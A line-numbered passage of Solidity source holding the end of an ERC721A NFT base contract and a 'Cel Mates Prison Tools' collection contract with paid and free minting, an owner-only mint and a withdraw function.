893 
894     /**
895      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
896      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
897      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
898      */
899     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
900         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
901         uint256 numMintedSoFar = totalSupply();
902         uint256 tokenIdsIdx;
903         address currOwnershipAddr;
904 
905         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
906         unchecked {
907             for (uint256 i; i < numMintedSoFar; i++) {
908                 TokenOwnership memory ownership = _ownerships[i];
909                 if (ownership.addr != address(0)) {
910                     currOwnershipAddr = ownership.addr;
911                 }
912                 if (currOwnershipAddr == owner) {
913                     if (tokenIdsIdx == index) {
914                         return i;
915                     }
916                     tokenIdsIdx++;
917                 }
918             }
919         }
920 
921         revert("ERC721A: unable to get token of owner by index");
922     }
923 
924     /**
925      * @dev See {IERC165-supportsInterface}.
926      */
927     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
928         return
929             interfaceId == type(IERC721).interfaceId ||
930             interfaceId == type(IERC721Metadata).interfaceId ||
931             interfaceId == type(IERC721Enumerable).interfaceId ||
932             super.supportsInterface(interfaceId);
933     }
934 
935     /**
936      * @dev See {IERC721-balanceOf}.
937      */
938     function balanceOf(address owner) public view override returns (uint256) {
939         require(owner != address(0), "ERC721A: balance query for the zero address");
940         return uint256(_addressData[owner].balance);
941     }
942 
943     function _numberMinted(address owner) internal view returns (uint256) {
944         require(owner != address(0), "ERC721A: number minted query for the zero address");
945         return uint256(_addressData[owner].numberMinted);
946     }
947 
948     /**
949      * Gas spent here starts off proportional to the maximum mint batch size.
950      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
951      */
952     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
953         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
954 
955         unchecked {
956             for (uint256 curr = tokenId; curr >= 0; curr--) {
957                 TokenOwnership memory ownership = _ownerships[curr];
958                 if (ownership.addr != address(0)) {
959                     return ownership;
960                 }
961             }
962         }
963 
964         revert("ERC721A: unable to determine the owner of token");
965     }
966 
967     /**
968      * @dev See {IERC721-ownerOf}.
969      */
970     function ownerOf(uint256 tokenId) public view override returns (address) {
971         return ownershipOf(tokenId).addr;
972     }
973 
974     /**
975      * @dev See {IERC721Metadata-name}.
976      */
977     function name() public view virtual override returns (string memory) {
978         return _name;
979     }
980 
981     /**
982      * @dev See {IERC721Metadata-symbol}.
983      */
984     function symbol() public view virtual override returns (string memory) {
985         return _symbol;
986     }
987 
988     /**
989      * @dev See {IERC721Metadata-tokenURI}.
990      */
991     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
992         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
993 
994         string memory baseURI = _baseURI();
995         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
996     }
997 
998     /**
999      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
1000      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
1001      * by default, can be overriden in child contracts.
1002      */
1003     function _baseURI() internal view virtual returns (string memory) {
1004         return "";
1005     }
1006 
1007     /**
1008      * @dev See {IERC721-approve}.
1009      */
1010     function approve(address to, uint256 tokenId) public override {
1011         address owner = ERC721A.ownerOf(tokenId);
1012         require(to != owner, "ERC721A: approval to current owner");
1013 
1014         require(
1015             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
1016             "ERC721A: approve caller is not owner nor approved for all"
1017         );
1018 
1019         _approve(to, tokenId, owner);
1020     }
1021 
1022     /**
1023      * @dev See {IERC721-getApproved}.
1024      */
1025     function getApproved(uint256 tokenId) public view override returns (address) {
1026         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
1027 
1028         return _tokenApprovals[tokenId];
1029     }
1030 
1031     /**
1032      * @dev See {IERC721-setApprovalForAll}.
1033      */
1034     function setApprovalForAll(address operator, bool approved) public override {
1035         require(operator != _msgSender(), "ERC721A: approve to caller");
1036 
1037         _operatorApprovals[_msgSender()][operator] = approved;
1038         emit ApprovalForAll(_msgSender(), operator, approved);
1039     }
1040 
1041     /**
1042      * @dev See {IERC721-isApprovedForAll}.
1043      */
1044     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1045         return _operatorApprovals[owner][operator];
1046     }
1047 
1048     /**
1049      * @dev See {IERC721-transferFrom}.
1050      */
1051     function transferFrom(
1052         address from,
1053         address to,
1054         uint256 tokenId
1055     ) public virtual override {
1056         _transfer(from, to, tokenId);
1057     }
1058 
1059     /**
1060      * @dev See {IERC721-safeTransferFrom}.
1061      */
1062     function safeTransferFrom(
1063         address from,
1064         address to,
1065         uint256 tokenId
1066     ) public virtual override {
1067         safeTransferFrom(from, to, tokenId, "");
1068     }
1069 
1070     /**
1071      * @dev See {IERC721-safeTransferFrom}.
1072      */
1073     function safeTransferFrom(
1074         address from,
1075         address to,
1076         uint256 tokenId,
1077         bytes memory _data
1078     ) public override {
1079         _transfer(from, to, tokenId);
1080         require(
1081             _checkOnERC721Received(from, to, tokenId, _data),
1082             "ERC721A: transfer to non ERC721Receiver implementer"
1083         );
1084     }
1085 
1086     /**
1087      * @dev Returns whether `tokenId` exists.
1088      *
1089      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1090      *
1091      * Tokens start existing when they are minted (`_mint`),
1092      */
1093     function _exists(uint256 tokenId) internal view returns (bool) {
1094         return tokenId < currentIndex;
1095     }
1096 
1097     function _safeMint(address to, uint256 quantity) internal {
1098         _safeMint(to, quantity, "");
1099     }
1100 
1101     /**
1102      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1103      *
1104      * Requirements:
1105      *
1106      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1107      * - `quantity` must be greater than 0.
1108      *
1109      * Emits a {Transfer} event.
1110      */
1111     function _safeMint(
1112         address to,
1113         uint256 quantity,
1114         bytes memory _data
1115     ) internal {
1116         _mint(to, quantity, _data, true);
1117     }
1118 
1119     /**
1120      * @dev Mints `quantity` tokens and transfers them to `to`.
1121      *
1122      * Requirements:
1123      *
1124      * - `to` cannot be the zero address.
1125      * - `quantity` must be greater than 0.
1126      *
1127      * Emits a {Transfer} event.
1128      */
1129     function _mint(
1130         address to,
1131         uint256 quantity,
1132         bytes memory _data,
1133         bool safe
1134     ) internal {
1135         uint256 startTokenId = currentIndex;
1136         require(to != address(0), "ERC721A: mint to the zero address");
1137         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1138 
1139         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1140 
1141         // Overflows are incredibly unrealistic.
1142         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1143         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1144         unchecked {
1145             _addressData[to].balance += uint128(quantity);
1146             _addressData[to].numberMinted += uint128(quantity);
1147 
1148             _ownerships[startTokenId].addr = to;
1149             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1150 
1151             uint256 updatedIndex = startTokenId;
1152 
1153             for (uint256 i; i < quantity; i++) {
1154                 emit Transfer(address(0), to, updatedIndex);
1155                 if (safe) {
1156                     require(
1157                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1158                         "ERC721A: transfer to non ERC721Receiver implementer"
1159                     );
1160                 }
1161 
1162                 updatedIndex++;
1163             }
1164 
1165             currentIndex = updatedIndex;
1166         }
1167 
1168         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1169     }
1170 
1171     /**
1172      * @dev Transfers `tokenId` from `from` to `to`.
1173      *
1174      * Requirements:
1175      *
1176      * - `to` cannot be the zero address.
1177      * - `tokenId` token must be owned by `from`.
1178      *
1179      * Emits a {Transfer} event.
1180      */
1181     function _transfer(
1182         address from,
1183         address to,
1184         uint256 tokenId
1185     ) private {
1186         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1187 
1188         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1189             getApproved(tokenId) == _msgSender() ||
1190             isApprovedForAll(prevOwnership.addr, _msgSender()));
1191 
1192         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1193 
1194         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1195         require(to != address(0), "ERC721A: transfer to the zero address");
1196 
1197         _beforeTokenTransfers(from, to, tokenId, 1);
1198 
1199         // Clear approvals from the previous owner
1200         _approve(address(0), tokenId, prevOwnership.addr);
1201 
1202         // Underflow of the sender's balance is impossible because we check for
1203         // ownership above and the recipient's balance can't realistically overflow.
1204         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1205         unchecked {
1206             _addressData[from].balance -= 1;
1207             _addressData[to].balance += 1;
1208 
1209             _ownerships[tokenId].addr = to;
1210             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1211 
1212             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1213             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1214             uint256 nextTokenId = tokenId + 1;
1215             if (_ownerships[nextTokenId].addr == address(0)) {
1216                 if (_exists(nextTokenId)) {
1217                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1218                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1219                 }
1220             }
1221         }
1222 
1223         emit Transfer(from, to, tokenId);
1224         _afterTokenTransfers(from, to, tokenId, 1);
1225     }
1226 
1227     /**
1228      * @dev Approve `to` to operate on `tokenId`
1229      *
1230      * Emits a {Approval} event.
1231      */
1232     function _approve(
1233         address to,
1234         uint256 tokenId,
1235         address owner
1236     ) private {
1237         _tokenApprovals[tokenId] = to;
1238         emit Approval(owner, to, tokenId);
1239     }
1240 
1241     /**
1242      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1243      * The call is not executed if the target address is not a contract.
1244      *
1245      * @param from address representing the previous owner of the given token ID
1246      * @param to target address that will receive the tokens
1247      * @param tokenId uint256 ID of the token to be transferred
1248      * @param _data bytes optional data to send along with the call
1249      * @return bool whether the call correctly returned the expected magic value
1250      */
1251     function _checkOnERC721Received(
1252         address from,
1253         address to,
1254         uint256 tokenId,
1255         bytes memory _data
1256     ) private returns (bool) {
1257         if (to.isContract()) {
1258             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1259                 return retval == IERC721Receiver(to).onERC721Received.selector;
1260             } catch (bytes memory reason) {
1261                 if (reason.length == 0) {
1262                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1263                 } else {
1264                     assembly {
1265                         revert(add(32, reason), mload(reason))
1266                     }
1267                 }
1268             }
1269         } else {
1270             return true;
1271         }
1272     }
1273 
1274     /**
1275      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1276      *
1277      * startTokenId - the first token id to be transferred
1278      * quantity - the amount to be transferred
1279      *
1280      * Calling conditions:
1281      *
1282      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1283      * transferred to `to`.
1284      * - When `from` is zero, `tokenId` will be minted for `to`.
1285      */
1286     function _beforeTokenTransfers(
1287         address from,
1288         address to,
1289         uint256 startTokenId,
1290         uint256 quantity
1291     ) internal virtual {}
1292 
1293     /**
1294      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1295      * minting.
1296      *
1297      * startTokenId - the first token id to be transferred
1298      * quantity - the amount to be transferred
1299      *
1300      * Calling conditions:
1301      *
1302      * - when `from` and `to` are both non-zero.
1303      * - `from` and `to` are never both zero.
1304      */
1305     function _afterTokenTransfers(
1306         address from,
1307         address to,
1308         uint256 startTokenId,
1309         uint256 quantity
1310     ) internal virtual {}
1311 }
1312 
1313 contract PrisonTools is ERC721A, Ownable, ReentrancyGuard {
1314     string public baseURI = "ipfs://Qmc9htxXTMXdN9meDSDSpSn6sKgbXVrDGAQjeW3acbGfUs//";
1315     uint   public price             = 0.005 ether;
1316     uint   public maxPerTx          = 20;
1317     uint   public maxPerFree        = 1;
1318     uint   public totalFree         = 8888;
1319     uint   public maxSupply         = 8888;
1320 
1321     mapping(address => uint256) private _mintedFreeAmount;
1322 
1323     constructor() ERC721A("Cel Mates Prison Tools", "TOOLS"){}
1324 
1325 
1326     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1327         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1328         string memory currentBaseURI = _baseURI();
1329         return bytes(currentBaseURI).length > 0
1330             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1331             : "";
1332     }
1333 
1334     function mint(uint256 count) external payable {
1335         uint256 cost = price;
1336         bool isFree = ((totalSupply() + count < totalFree + 1) &&
1337             (_mintedFreeAmount[msg.sender] + count <= maxPerFree));
1338 
1339         if (isFree) {
1340             cost = 0;
1341             _mintedFreeAmount[msg.sender] += count;
1342         }
1343 
1344         require(msg.value >= count * cost, "Please send the exact amount.");
1345         require(totalSupply() + count <= maxSupply, "No more");
1346         require(count <= maxPerTx, "Max per TX reached.");
1347 
1348         _safeMint(msg.sender, count);
1349     }
1350 
1351     function sleeping(address mintAddress, uint256 count) public onlyOwner {
1352         _safeMint(mintAddress, count);
1353     }
1354 
1355 
1356 
1357     function _baseURI() internal view virtual override returns (string memory) {
1358         return baseURI;
1359     }
1360 
1361     function setBaseUri(string memory baseuri_) public onlyOwner {
1362         baseURI = baseuri_;
1363     }
1364 
1365     function setPrice(uint256 price_) external onlyOwner {
1366         price = price_;
1367     }
1368 
1369     function withdraw() external onlyOwner nonReentrant {
1370         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1371         require(success, "Transfer failed.");
1372     }
1373 }